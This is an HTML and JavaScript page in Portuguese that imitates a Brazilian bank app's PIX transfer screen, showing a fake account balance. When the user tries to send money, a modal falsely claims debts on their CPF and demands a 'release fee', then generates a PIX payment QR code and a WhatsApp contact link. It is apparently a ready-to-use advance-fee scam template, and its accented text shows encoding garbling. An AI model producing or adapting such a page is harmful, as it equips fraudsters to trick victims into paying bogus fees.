<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enviar PIX ‚Äî Elisa Nunes</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <style>
    :root{
      --primary-start: #1462d8;
      --primary-end: #0b3e86;
      --muted: rgba(255,255,255,0.65);
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(180deg, var(--primary-start), var(--primary-end));
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
      height: 100vh;
    }

    .phone {
      width: 100%;
      max-width: 400px;
      height: 100vh;
      background: linear-gradient(180deg, var(--primary-start), var(--primary-end));
      border-radius: 0;
      box-shadow: none;
      overflow-y: auto;
      border: none;
      position: relative;
    }

    .screen {
      padding: 18px;
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      color: white;
    }

    .chip{
      display:inline-flex;
      align-items:center;
      gap:8px;
      padding:8px 12px;
      border-radius:999px;
      background:rgba(255,255,255,0.1);
      margin-bottom: 15px;
    }

    .small-muted{
      color: var(--muted);
      font-size: 13px;
    }

    a { text-decoration: none; color: inherit; }

    input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 12px;
      border: none;
      outline: none;
      color: #003b99;
      font-size: 0.875rem;
    }

    input::placeholder {
      color: #6b7280;
    }

    .action-btn {
      display: block;
      width: 100%;
      background-color: #00c3ff;
      color: white;
      font-weight: 600;
      text-align: center;
      padding: 12px;
      margin-top: 12px;
      border-radius: 12px;
      text-decoration: none;
      transition: background 0.2s;
      cursor: pointer;
      border: none;
    }

    .action-btn:hover { background-color: #00a6e6; }

    #qrSection {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 12px;
    }

    #qrcode { margin: 15px 0; }

    /* Modal Fullscreen */
    #pixModal {
      display: none;
      position: fixed;
      z-index: 50;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    #pixModal .modal-content {
      width: 100%;
      max-width: 400px;
      background: white;
      color: #003b99;
      border-radius: 20px;
      padding: 20px;
      text-align: center;
      overflow-y: auto;
      max-height: 90%;
    }

    .close-btn {
      float: right;
      font-size: 24px;
      font-weight: bold;
      cursor: pointer;
      color: #003b99;
    }

    .grid-scroll::-webkit-scrollbar { display: none; }
  </style>
</head>
<body>
<div class="phone">
  <div class="screen">
    <!-- Topo -->
    <div class="flex items-center justify-between mb-4">
      <a href="telainicial.html" class="w-8 h-8 flex items-center justify-center rounded-full bg-white/10 text-white/90">‚Üê</a>
      <div class="flex items-center gap-2 text-white">
        <div class="bg-white text-[#0b3e86] font-bold rounded-full w-8 h-8 flex items-center justify-center">EN</div>
        <div class="text-sm font-semibold">Elisa Nunes</div>
      </div>
      <div class="w-8"></div>
    </div>

    <!-- T√≠tulo PIX -->
    <div class="chip text-white text-xs">
      <span class="w-2 h-2 rounded-full bg-green-400 inline-block"></span>
      <span class="small-muted">üí∏ ENVIAR PIX</span>
    </div>

    <!-- Input e Bot√£o sem fundo extra -->
    <input type="text" placeholder="E-mail, CPF, telefone ou chave aleat√≥ria" class="mb-2"/>
    <button id="openModal" class="action-btn">Enviar PIX</button>
    <div class="mt-2 text-xs small-muted">Saldo dispon√≠vel: R$ 5.250,00</div>
  </div>
</div>

<!-- Modal Fullscreen -->
<div id="pixModal">
  <div class="modal-content">
    <span class="close-btn" id="closeModal">&times;</span>
    <div id="modalText">
      <p>‚ö†Ô∏è <strong>Aten√ß√£o, Cliente</strong></p>
      <p class="mt-2">Identificamos pend√™ncias financeiras em outros bancos em seu CPF. Para libera√ß√£o segura do limite, √© necess√°rio dep√≥sito da taxa de libera√ß√£o.</p>
      <button id="payBtn" class="action-btn">Pagar</button>
      <a href="https://wa.me/5511999999999" target="_blank" class="action-btn mt-2">WhatsApp</a>
    </div>
    <div id="qrSection" style="display:none;">
      <div id="qrcode"></div>
      <button id="copyQR" class="action-btn">Copiar C√≥digo QR</button>
    </div>
  </div>
</div>

<script>
  const modal = document.getElementById("pixModal");
  const btn = document.getElementById("openModal");
  const close = document.getElementById("closeModal");
  const payBtn = document.getElementById("payBtn");
  const qrSection = document.getElementById("qrSection");
  const modalText = document.getElementById("modalText");
  const copyQR = document.getElementById("copyQR");

  btn.onclick = function() { modal.style.display = "flex"; }
  close.onclick = function() {
    modal.style.display = "none";
    qrSection.style.display = "none";
    modalText.style.display = "block";
    document.getElementById("qrcode").innerHTML = '';
  }
  window.onclick = function(event) {
    if(event.target == modal){
      modal.style.display = "none";
      qrSection.style.display = "none";
      modalText.style.display = "block";
      document.getElementById("qrcode").innerHTML = '';
    }
  }

  payBtn.onclick = function() {
    modalText.style.display = "none";
    qrSection.style.display = "flex";
    document.getElementById("qrcode").innerHTML = '';
    new QRCode(document.getElementById("qrcode"), {
      text: "00020126360014BR.GOV.BCB.PIX0114+55119999999952040000530398654045.005802BR5925Elisa Nunes6009Sao Paulo62070503***6304ABCD",
      width: 200,
      height: 200
    });
  }

  copyQR.onclick = function() {
    const qrText = "00020126360014BR.GOV.BCB.PIX0114+55119999999952040000530398654045.005802BR5925Elisa Nunes6009Sao Paulo62070503***6304ABCD";
    navigator.clipboard.writeText(qrText).then(()=>alert("C√≥digo QR copiado!"));
  }
</script>
</body>
</html>
